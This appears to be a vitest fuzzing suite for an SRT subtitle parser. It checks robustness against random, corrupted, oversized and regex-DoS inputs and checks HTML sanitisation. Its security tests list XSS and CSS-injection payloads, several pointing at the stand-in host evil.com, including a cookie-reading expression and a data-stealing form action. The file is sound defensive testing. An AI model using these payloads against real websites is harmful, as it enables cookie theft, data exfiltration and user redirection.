import { describe, expect, it } from 'vitest'
import { parseSrt } from './srt/parser'
import { stripHtmlTags, decodeHtmlEntities } from './srt/parser'
import { convertSrtToFcpxml } from './index'

describe('Fuzzing Tests for Security Validation', () => {
  // Random string generator with various character sets
  function generateRandomString(length: number, charset: string = 'default'): string {
    const charsets = {
      default: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
      special: '!@#$%^&*()_+-=[]{}|;:,.<>?',
      html: '<>&"\'',
      unicode: 'αβγδεζηθικλμνξοπρστυφχψω',
      emoji: '😀😁😂🤣😃😄😅😆😉😊😋😎😍😘🥰😗',
      control: '\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F',
      mixed: 'Aa1!αβ😀<>&"\'\\x00\\x01'
    }

    const chars = charsets[charset as keyof typeof charsets] || charsets.default
    let result = ''
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length))
    }
    return result
  }

  // Generate random SRT-like content
  function generateRandomSrt(
    subtitleCount: number = 10,
    maxTextLength: number = 200,
    corruptionChance: number = 0.1
  ): string {
    let srt = ''

    for (let i = 1; i <= subtitleCount; i++) {
      // Random corruption
      if (Math.random() < corruptionChance) {
        // Add random corruption
        switch (Math.floor(Math.random() * 5)) {
          case 0:
            srt += `${i}\n${generateRandomString(50)}\n\n` // Invalid timestamp
            break
          case 1:
            srt += `${generateRandomString(10)}\n00:00:01,000 --> 00:00:03,000\nText\n\n` // Invalid index
            break
          case 2:
            srt += `${i}\n00:00:01,000 --> 00:00:03,000\n\n` // Empty text
            break
          case 3:
            srt += generateRandomString(100) + '\n\n' // Complete garbage
            break
          case 4:
            // Skip this iteration entirely
            continue
        }
      } else {
        // Generate valid but potentially problematic SRT entry
        const hour = String(Math.floor(Math.random() * 24)).padStart(2, '0')
        const min = String(Math.floor(Math.random() * 60)).padStart(2, '0')
        const sec = String(Math.floor(Math.random() * 60)).padStart(2, '0')
        const ms = String(Math.floor(Math.random() * 1000)).padStart(3, '0')

        const endHour = String(Math.floor(Math.random() * 24)).padStart(2, '0')
        const endMin = String(Math.floor(Math.random() * 60)).padStart(2, '0')
        const endSec = String(Math.floor(Math.random() * 60)).padStart(2, '0')
        const endMs = String(Math.floor(Math.random() * 1000)).padStart(3, '0')

        // Random text with various character sets
        const charset = ['default', 'special', 'html', 'unicode', 'emoji', 'mixed'][Math.floor(Math.random() * 6)]
        const textLength = Math.floor(Math.random() * maxTextLength) + 1
        const text = generateRandomString(textLength, charset)

        srt += `${i}\n${hour}:${min}:${sec},${ms} --> ${endHour}:${endMin}:${endSec},${endMs}\n${text}\n\n`
      }
    }

    return srt
  }

  // Generate malicious HTML/CSS patterns
  function generateMaliciousHtml(): string[] {
    return [
      '<script>alert("xss")</script>',
      '<script src="http://evil.com/malicious.js"></script>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      '<style>body{display:none}</style>',
      '<link rel="stylesheet" href="http://evil.com/style.css">',
      '<object data="http://evil.com/malicious.swf"></object>',
      '<embed src="http://evil.com/malicious.swf">',
      '<applet code="Malicious.class"></applet>',
      '<form action="http://evil.com/steal-data" method="post">',
      '<meta http-equiv="refresh" content="0;url=http://evil.com">',
      '<base href="http://evil.com/">',
      '<body onload="alert(1)">',
      '<div style="background: url(javascript:alert(1))">',
      '<div style="behavior: url(http://evil.com/malicious.htc)">',
      '<div style="-moz-binding: url(http://evil.com/malicious.xml)">',
      '<div style="expression(alert(1))">',
      '<div style="@import url(http://evil.com/style.css)">',
      '<!-- [if IE]><script>alert(1)</script><![endif] -->'
    ]
  }

  describe('Random Input Fuzzing', () => {
    it('should handle completely random SRT content without crashing', () => {
      for (let i = 0; i < 50; i++) {
        const randomSrt = generateRandomSrt(Math.floor(Math.random() * 20) + 1, 500, 0.3)

        expect(() => {
          const result = parseSrt(randomSrt)
          // Should not crash, even if parsing fails
          expect(result).toBeDefined()
          expect(Array.isArray(result.cues)).toBe(true)
          expect(Array.isArray(result.errors)).toBe(true)
        }).not.toThrow()
      }
    })

    it('should handle random character sequences in HTML stripping', () => {
      for (let i = 0; i < 100; i++) {
        const randomText = generateRandomString(Math.floor(Math.random() * 1000) + 1, 'mixed')

        expect(() => {
          const result = stripHtmlTags(randomText)
          expect(typeof result).toBe('string')
          // Should not contain script tags
          expect(result.toLowerCase()).not.toContain('<script')
          expect(result.toLowerCase()).not.toContain('<style')
        }).not.toThrow()
      }
    })

    it('should handle random entity sequences safely', () => {
      for (let i = 0; i < 100; i++) {
        // Generate random entity-like patterns
        const entityTypes = [
          () => `&#${Math.floor(Math.random() * 2000000)};`, // Random numeric
          () => `&#x${Math.floor(Math.random() * 1000000).toString(16)};`, // Random hex
          () => `&${generateRandomString(10)};`, // Random named entity
          () => `&${generateRandomString(3)};`, // Short random entity
          () => `&#${generateRandomString(5)};`, // Invalid numeric
          () => `&#x${generateRandomString(8)};`, // Invalid hex
          () => `&amp${generateRandomString(5)}`, // Incomplete entity
          () => `&${generateRandomString(20)}`, // Very long entity name
        ]

        const randomEntity = entityTypes[Math.floor(Math.random() * entityTypes.length)]()

        expect(() => {
          const result = decodeHtmlEntities(randomEntity)
          expect(typeof result).toBe('string')
        }).not.toThrow()
      }
    })
  })

  describe('Security-Focused Fuzzing', () => {
    it('should handle malicious HTML injection attempts', () => {
      const maliciousPatterns = generateMaliciousHtml()

      for (const pattern of maliciousPatterns) {
        const maliciousSrt = `1
00:00:01,000 --> 00:00:03,000
${pattern}
Normal text after attack.`

        expect(() => {
          const result = parseSrt(maliciousSrt)
          const processedText = result.cues.length > 0 ? result.cues[0].text : ''

          // Should strip dangerous content
          expect(processedText.toLowerCase()).not.toContain('<script')
          expect(processedText.toLowerCase()).not.toContain('javascript:')
          expect(processedText.toLowerCase()).not.toContain('<style')
          expect(processedText.toLowerCase()).not.toContain('<iframe')
          expect(processedText.toLowerCase()).not.toContain('onerror')
          expect(processedText.toLowerCase()).not.toContain('onload')
        }).not.toThrow()
      }
    })

    it('should handle CSS injection attempts in style attributes', () => {
      const cssInjections = [
        'background: url(javascript:alert(1))',
        'behavior: url(http://evil.com/malicious.htc)',
        '-moz-binding: url(http://evil.com/malicious.xml)',
        'expression(alert(document.cookie))',
        '@import url("http://evil.com/style.css")',
        'background: url(data:text/html,<script>alert(1)</script>)',
        'background: url(vbscript:msgbox(1))',
        'width: expression(alert("xss"))',
        'color: expression(document.location="http://evil.com")',
        'font-family: expression(eval("alert(1)"))'
      ]

      for (const injection of cssInjections) {
        const maliciousSrt = `1
00:00:01,000 --> 00:00:03,000
<span style="${injection}">CSS injection test</span>`

        expect(() => {
          const result = parseSrt(maliciousSrt)
          const processedText = result.cues.length > 0 ? result.cues[0].text : ''

          // Should strip dangerous CSS
          expect(processedText.toLowerCase()).not.toContain('javascript:')
          expect(processedText.toLowerCase()).not.toContain('expression(')
          expect(processedText.toLowerCase()).not.toContain('behavior:')
          expect(processedText.toLowerCase()).not.toContain('binding:')
          expect(processedText.toLowerCase()).not.toContain('vbscript:')
        }).not.toThrow()
      }
    })

    it('should handle extreme Unicode and entity attacks', () => {
      const unicodeAttacks = [
        // Surrogate pairs
        '\uD800\uDC00', '\uDBFF\uDFFF',
        // Control characters
        '\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F',
        // Zero-width characters
        '\u200B\u200C\u200D\u2060\uFEFF',
        // Bidirectional override
        '\u202D\u202E',
        // Very long entity sequences
        '&' + 'a'.repeat(1000) + ';',
        '&#' + '1'.repeat(100) + ';',
        '&#x' + 'f'.repeat(50) + ';',
        // Nested entities
        '&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;',
        // Mixed encoding
        '%3Cscript%3Ealert(1)%3C/script%3E'
      ]

      for (const attack of unicodeAttacks) {
        const attackSrt = `1
00:00:01,000 --> 00:00:03,000
${attack}
Normal text after unicode attack.`

        expect(() => {
          const result = parseSrt(attackSrt)
          // Should handle gracefully without crashing
          expect(result).toBeDefined()
        }).not.toThrow()
      }
    })
  })

  describe('Memory and Performance Attack Fuzzing', () => {
    it('should handle extremely long text without memory exhaustion', () => {
      // Test with increasingly long content
      const lengths = [1000, 10000, 100000, 500000]

      for (const length of lengths) {
        const longText = 'A'.repeat(length)
        const longSrt = `1
00:00:01,000 --> 00:00:03,000
${longText}`

        expect(() => {
          const startMemory = process.memoryUsage().heapUsed
          const result = parseSrt(longSrt)
          const endMemory = process.memoryUsage().heapUsed

          expect(result).toBeDefined()

          // Memory usage shouldn't be excessive (less than 12x the input size)
          const memoryIncrease = endMemory - startMemory
          expect(memoryIncrease).toBeLessThan(length * 12)
        }).not.toThrow()
      }
    })

    it('should handle deeply nested HTML without stack overflow', () => {
      // Create deeply nested HTML
      const depth = 1000
      let nestedHtml = ''
      for (let i = 0; i < depth; i++) {
        nestedHtml += '<div>'
      }
      nestedHtml += 'content'
      for (let i = 0; i < depth; i++) {
        nestedHtml += '</div>'
      }

      const nestedSrt = `1
00:00:01,000 --> 00:00:03,000
${nestedHtml}`

      expect(() => {
        const result = parseSrt(nestedSrt)
        expect(result).toBeDefined()
        // Should extract the content
        expect(result.cues.length > 0 ? result.cues[0].text : '').toBe('content')
      }).not.toThrow()
    })

    it('should handle massive numbers of entities without hanging', () => {
      // Create text with thousands of entities
      const entityCount = 10000
      let entityText = ''
      for (let i = 0; i < entityCount; i++) {
        entityText += '&amp;'
      }

      const entitySrt = `1
00:00:01,000 --> 00:00:03,000
${entityText}`

      expect(() => {
        const startTime = Date.now()
        const result = parseSrt(entitySrt)
        const endTime = Date.now()

        expect(result).toBeDefined()
        // Should complete in reasonable time (less than 5 seconds)
        expect(endTime - startTime).toBeLessThan(5000)
      }).not.toThrow()
    })

    it('should handle regex DoS patterns safely', () => {
      // Patterns that could cause catastrophic backtracking
      const regexDoSPatterns = [
        // Nested quantifiers
        'a'.repeat(100) + '!',
        'a*a*a*a*a*a*a*a*a*a*a*',
        '(a+)+b',
        '(a|a)*',
        '(a|b)*abb',
        // Long alternation
        'a'.repeat(50) + '|' + 'b'.repeat(50),
        // Complex HTML-like patterns
        '<' + 'a'.repeat(100) + ' onclick="' + 'x'.repeat(100) + '">',
      ]

      for (const pattern of regexDoSPatterns) {
        const dosSrt = `1
00:00:01,000 --> 00:00:03,000
${pattern}`

        expect(() => {
          const startTime = Date.now()
          const result = parseSrt(dosSrt)
          const endTime = Date.now()

          expect(result).toBeDefined()
          // Should complete quickly (less than 1 second per pattern)
          expect(endTime - startTime).toBeLessThan(1000)
        }).not.toThrow()
      }
    })
  })

  describe('Format Confusion Fuzzing', () => {
    it('should handle mixed and invalid timestamp formats', () => {
      const invalidTimestamps = [
        '25:00:01,000 --> 00:00:03,000', // Invalid hour
        '00:61:01,000 --> 00:00:03,000', // Invalid minute
        '00:00:61,000 --> 00:00:03,000', // Invalid second
        '00:00:01,1000 --> 00:00:03,000', // Invalid millisecond
        '00:00:01.000 --> 00:00:03.000', // Wrong separator
        '00:00:01:000 -> 00:00:03:000', // Wrong arrow
        '1:2:3,4 --> 5:6:7,8', // No padding
        'invalid --> timestamp',
        '00:00:01,000 <-- 00:00:03,000', // Wrong arrow direction
        '00:00:03,000 --> 00:00:01,000', // End before start
      ]

      for (const timestamp of invalidTimestamps) {
        const invalidSrt = `1
${timestamp}
This has an invalid timestamp.`

        expect(() => {
          const result = parseSrt(invalidSrt)
          // Should handle gracefully, either parsing or adding to errors
          expect(result).toBeDefined()
          expect(Array.isArray(result.cues)).toBe(true)
          expect(Array.isArray(result.errors)).toBe(true)
        }).not.toThrow()
      }
    })

    it('should handle various line ending combinations', () => {
      const lineEndings = ['\n', '\r\n', '\r', '\n\n', '\r\r', '\n\r', '\r\n\n']

      for (const ending of lineEndings) {
        const srt = `1${ending}00:00:01,000 --> 00:00:03,000${ending}Test content${ending}${ending}`

        expect(() => {
          const result = parseSrt(srt)
          expect(result).toBeDefined()
        }).not.toThrow()
      }
    })

    it('should handle mixed encoding and byte order marks', () => {
      const bomPatterns = [
        '\uFEFF', // UTF-8 BOM
        '\xFF\xFE', // UTF-16 LE BOM
        '\xFE\xFF', // UTF-16 BE BOM
        '\xFF\xFE\x00\x00', // UTF-32 LE BOM
      ]

      for (const bom of bomPatterns) {
        const bomSrt = `${bom}1
00:00:01,000 --> 00:00:03,000
Content with BOM`

        expect(() => {
          const result = parseSrt(bomSrt)
          expect(result).toBeDefined()
        }).not.toThrow()
      }
    })
  })
})